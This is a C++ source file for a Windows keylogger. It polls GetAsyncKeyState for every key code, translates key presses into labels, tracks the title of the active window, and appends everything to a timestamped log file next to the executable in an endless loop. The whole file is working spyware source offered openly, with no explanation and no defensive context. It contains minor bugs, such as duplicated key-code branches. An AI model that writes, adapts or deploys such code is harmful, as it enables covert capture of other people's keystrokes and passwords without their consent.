#include "stdafx.h"
#include "Keylogger.h"
#include "Application_History.h"

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
#include <fstream>


#define FILEEXT ".log"
#define DEBUG
#define DEBUG_TO_LOGS

std::string Keylogger::intToString(int i)
{
	//#ifdef DEBUG
	printf("Converting: %d to string.\n", i);
	//#endif
	char buffer[4];
	_itoa_s(i, buffer, 4, 10);
	return std::string(buffer);
}

std::string Keylogger::getSelfPath()
{
#ifdef DEBUG
	//printf("getSelfPath() ");
#endif
	char selfpath[MAX_PATH];
	wchar_t selfpath_wchar[MAX_PATH];

	GetModuleFileName(NULL, selfpath_wchar, MAX_PATH);
	size_t pReturnValue;
	wcstombs_s(&pReturnValue, selfpath, MAX_PATH, selfpath_wchar, MAX_PATH);

	return std::string(selfpath);
}

std::string Keylogger::dirBasename(std::string path)
{
#ifdef DEBUG
	//printf("dirBasename() ");
#endif
	if (path.empty())
		return std::string("");

	if (path.find("\\") == std::string::npos)
		return path;

	if (path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	size_t pos = path.find_last_of("\\");
	if (pos != std::string::npos)
		path = path.substr(0, pos);

	if (path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	return path;
}


//bool Keylogger::update_window(const std::string &last_title, const std::string &current_title, std::ofstream &file_logs)
//{
//	if (last_title != current_title)
//	{
//		file_logs << std::endl << std::endl << "Window: ";
//#ifdef DEBUG
//		std::cout << std::endl << std::endl << "Window: ";
//#endif
//		if (current_title.empty())
//		{
//			//file_logs << "NO ACTIVE WINDOW";
//#ifdef DEBUG
//			std::cout << "NO ACTIVE WINDOW";
//#endif
//		}
//		else
//		{
//			//file_logs << "'" << title << "'";
//#ifdef DEBUG
//			std::cout << "'" << current_title << "'";
//#endif
//		}
//		//file_logs << std::endl;
//#ifdef DEBUG
//		std::cout << std::endl;
//#endif
//
//		return true;
//	}
//
//	return false;
//}

//std::string Keylogger::get_window_name()
//{
//#ifdef DEBUG_TO_LOGS
//	//printf("Geting title of the window.\n");
//#endif
//
//	// get the active windowtitle
//	char title[1024];
//	wchar_t title_wchar[1024];
//	HWND hwndHandle = GetForegroundWindow();
//	GetWindowText(hwndHandle, title_wchar, 1023);
//
//	size_t pReturnValue;
//	wcstombs_s(&pReturnValue, title, MAX_PATH, title_wchar, MAX_PATH);
//
//#ifdef DEBUG_TO_LOGS
//	// save window name
//#endif
//
//	return std::string(title);
//}


void Keylogger::get_key(std::ofstream &file_logs)
{
	// logging keys, thats the keylogger

	for (unsigned char c = 1; c < 255; c++)
	{
#ifdef DEBUG_TO_LOGS
		//printf("Calling GetAsyncKeyState()", filepath);
#endif // DEBUG
		SHORT return_value = GetAsyncKeyState(c);
#ifdef DEBUG_TO_LOGS
		//printf("GetAsyncKeyState() returned: %d", return_value);
#endif // DEBUG
		if (return_value & 1)
		{ // on press button down
			std::string key = "";
			if (c == 1)
				key = "[LEFT MOUSE]"; // mouse left
			else if (c == 2)
				key = "[RIGHT MOUSE]"; // mouse right
			else if (c == 4)
				key = "[MIDDLE MOUSE]"; // mouse middle
			else if (c == 13)
				key = "[ENTER]";
			else if (c == 16 || c == 17 || c == 18)
				key = "";
			else if (c == 160 || c == 161) // lastc == 16
				key = "[SHIFT]";
			else if (c == 162) // lastc == 17
				key = "[LEFT CTRL]";
			else if (c == 163) // lastc == 17
				key = "[RIGHT CTRL]";
			else if (c == 164) // lastc == 18
				key = "[LEFT ALT]";
			else if (c == 165)
				key = "[RIGHT ALT]";
			else if (c == 8)
				key = "[BACKSPACE]";
			else if (c == 9)
				key = "[TAB]";
			else if (c == 20)
				key = "[CAPS LOCK]";
			else if (c == 27)
				key = "[ESC]";
			else if (c == 33)
				key = "[PAGE UP]";
			else if (c == 34)
				key = "[PAGE DOWN]";
			else if (c == 35)
				key = "[HOME]";
			else if (c == 36)
				key = "[POS1]";
			else if (c == 37)
				key = "[ARROW LEFT]";
			else if (c == 38)
				key = "[ARROW UP]";
			else if (c == 39)
				key = "[ARROW RIGHT]";
			else if (c == 40)
				key = "[ARROW DOWN]";
			else if (c == 45)
				key = "[INS]";
			else if (c == 46)
				key = "[DEL]";
			else if ((c >= 65 && c <= 90)
				|| (c >= 48 && c <= 57)
				|| c == 32) // letters and numbers
				key = c;

			else if (c == 91 || c == 92)
				key = "[WIN]";
			else if (c >= 96 && c <= 105)
				key = "[NUM " + intToString(c - 96) + "]";
			else if (c == 106)
				key = "[NUM /]";
			else if (c == 107)
				key = "[NUM +]";
			else if (c == 109)
				key = "[NUM -]";
			else if (c == 109)
				key = "[NUM ,]";
			else if (c >= 112 && c <= 123)
				key = "[F" + intToString(c - 111) + "]";
			else if (c == 144)
				key = "[NUM]";
			else if (c == 192)
				key = "[`]";
			else if (c == 222)
				key = "'";
			else if (c == 186)
				key = ";";
			else if (c == 186)
				key = "+";
			else if (c == 187)
				key = "=";
			else if (c == 188)
				key = ",";
			else if (c == 189)
				key = "-";
			else if (c == 190)
				key = ".";
			else if (c == 191)
				key = "/";
			else if (c == 219)
				key = "[";
			else if (c == 220)
				key = "\\";
			else if (c == 221)
				key = "]";
			else if (c == 226)
				key = "<";
			else
				key = intToString(c);


#ifdef DEBUG
			printf("Key = %s (%d)\n", key.c_str(), c);
#endif
			file_logs << key;
			file_logs.flush();
		}
	}
}
std::string Keylogger::create_file()
{
	time_t rawtime;
	struct tm timeinfo;
	time(&rawtime);
	localtime_s(&timeinfo, &rawtime);

	std::string basepath = dirBasename(getSelfPath());
	char file_name[MAX_PATH];
	char file_path[MAX_PATH];
	strftime(file_name, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
	sprintf_s(file_path, MAX_PATH, "%s\\%s%s", basepath.c_str(), file_name, FILEEXT);

#ifdef DEBUG
	printf("Saving content to: filepath '%s'\n", file_path);
#endif // DEBUG

	return std::string(file_path);
}


int main(int argc, char *argv[])
{
	Keylogger keylogger;
	std::string file_path = keylogger.create_file();
	std::ofstream file_logs(file_path);

	Application_History application_history(file_logs, file_path);

	while (1)
	{
		Sleep(10); // give other programs time to run

		application_history.get_window_name();
		application_history.update_window();
		keylogger.get_key(file_logs);
	}

	file_logs.close();

	return 0;
}
